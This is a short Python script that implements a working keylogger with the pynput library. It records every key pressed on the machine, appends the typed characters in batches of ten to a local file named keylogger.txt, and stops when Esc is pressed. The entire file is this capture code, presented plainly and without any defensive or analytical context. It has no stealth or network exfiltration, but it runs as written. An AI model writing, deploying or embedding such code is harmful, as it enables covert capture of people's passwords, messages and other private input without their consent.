import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

#Records key presses into keys list, and writes the contents of the list into a text file after 10 keys are pressed 
def on_press(key):
    global count
    global keys
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        write_to_file(keys)
        keys = []

#Transfers contents of keys list into a text file, and creates a new line each time the space bar is pressed
def write_to_file(keys):
    with open("keylogger.txt", "a") as f:
        for key in keys:
            x = str(key).replace("'", "")
            if x.find("space") > 0:
                f.write('\n')
            elif x.find("Key") == -1:
                f.write(x)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()